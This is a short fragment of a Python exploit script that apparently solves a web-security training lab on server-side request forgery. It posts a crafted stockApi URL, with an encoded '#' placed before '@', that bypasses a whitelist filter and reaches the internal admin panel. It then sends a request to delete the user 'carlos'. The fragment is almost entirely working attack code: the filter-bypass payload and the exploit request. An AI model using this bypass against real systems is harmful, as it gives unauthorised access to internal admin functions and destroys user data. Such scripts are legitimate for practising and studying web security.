...
def ssrf(url):
    ...
    admin_panel = "http://localhost%23@stock.weliketoshop.net/admin"
    data = {"stockApi": admin_panel}
    ...
    print(f"{YELLOW}[+] Bypass: {admin_panel}{RESET}")
    print(f"{GREEN}[+] Deleting user carlos{RESET}")
    data = {"stockApi": f"{admin_panel}/delete?username=carlos"}
    r = requests.post(url + "/product/stock", headers=headers, data=data, verify=False, proxies=proxies)
